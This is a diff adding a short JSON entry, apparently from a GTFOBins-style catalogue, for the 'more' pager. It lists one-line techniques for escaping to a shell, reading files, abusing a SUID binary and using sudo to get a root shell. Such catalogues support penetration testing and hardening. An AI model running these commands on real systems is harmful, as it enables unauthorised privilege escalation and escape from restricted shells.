@@ -1,0 +1,24 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "TERM= more /etc/profile\n!/bin/sh\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "more [file]"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./more [file]"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TERM= sudo -E more /etc/profile\n!/bin/sh\n"
+      }
+    ]
+  }
+}
